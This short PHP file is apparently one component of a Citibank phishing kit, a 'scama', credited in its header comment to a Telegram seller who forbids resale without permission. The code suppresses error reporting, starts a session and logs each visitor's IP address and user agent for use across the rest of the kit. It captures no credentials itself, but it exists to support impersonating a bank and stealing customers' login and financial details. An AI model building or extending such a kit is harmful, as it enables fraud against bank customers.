<?php
/**
 * This is Citi Bank Scama By @Yun_sun On tg...
 * @author @Yun_sun
 * @version 1.0
 * @right's don't share / sell without permisson

 */

/* 
THIS PAGE IS FOR GENERATING A SESSION ID WHICH WILL BE USED THROUGHOUT...

*/

error_reporting(0);

session_start();

function get_user_ip(){
    if (!empty($_SERVER['HTTP_CLIENT_IP']))   
    {
      $ip_address = $_SERVER['HTTP_CLIENT_IP'];
    }
  //whether ip is from proxy
  elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))  
    {
      $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }
  //whether ip is from remote address
  else
    {
      $ip_address = $_SERVER['REMOTE_ADDR'];
    }
  $_SESSION['ip'] = $ip_address;

  $_SESSION['usragent'] =  $_SERVER['HTTP_USER_AGENT'];


}

get_user_ip();